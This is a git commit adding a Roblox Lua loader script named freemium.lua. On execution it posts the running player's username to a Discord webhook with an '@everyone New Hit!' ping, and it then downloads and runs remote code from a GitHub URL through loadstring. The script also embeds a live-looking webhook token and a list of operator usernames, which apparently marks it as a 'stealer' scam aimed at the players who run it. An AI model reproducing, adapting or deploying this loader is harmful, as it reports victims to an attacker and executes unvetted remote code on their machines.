d08004953ccc5b4a3fa4904df9c15b56859002af
BaddiesScripted <likinggangfr3@gmail.com>
2026-04-19 01:16:12 +0000

    Create freemium.lua

---
+++ freemium.lua
@@ -0,0 +1,22 @@
+-- Your Own Loader (set up like Balsback7/Baddies)
+
+_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495064163356119165/k_RO1jp0D6hDfHomulVsNPga2rPuoDmWYBQ0gQShg9Pqo0Bw899-sIE0Ob3pDeaNAscy"
+
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames
+
+_G.PING_POOR = true
+
+-- Send Discord ping
+task.spawn(function()
+    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
+        local http = game:GetService("HttpService")
+        local plr = game.Players.LocalPlayer
+        local message = "@everyone New Hit! Username: " .. plr.Name
+        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
+    end
+end)
+
+-- Load your main cheat (this is your "baddies" file)
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/baddies-file/refs/heads/main/baddies", true))()
+end)
